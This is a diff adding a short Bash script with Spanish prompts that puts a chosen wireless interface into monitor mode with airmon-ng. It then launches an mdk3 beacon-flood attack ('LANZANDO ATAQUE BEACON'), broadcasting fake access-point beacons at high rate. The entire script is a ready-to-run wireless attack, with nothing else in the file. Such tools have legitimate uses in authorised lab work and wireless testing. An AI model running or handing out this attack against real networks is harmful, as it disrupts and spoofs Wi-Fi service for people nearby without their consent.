@@ -1,0 +1,22 @@
+#!/bin/bash
+
+clear
+
+ip a
+
+echo ""
+read -p "Interfaz a poner en modo monitor: " interfaz
+
+airmon-ng start ${interfaz}
+
+echo""
+read -p "Nombre nuevo de la interfaz en modo monitor: " monitor
+
+sleep 2
+
+clear
+
+echo "LANZANDO ATAQUE BEACON"
+echo "Ctrl + C para cancelar el ataque"
+
+mdk3 ${monitor} b -s 500
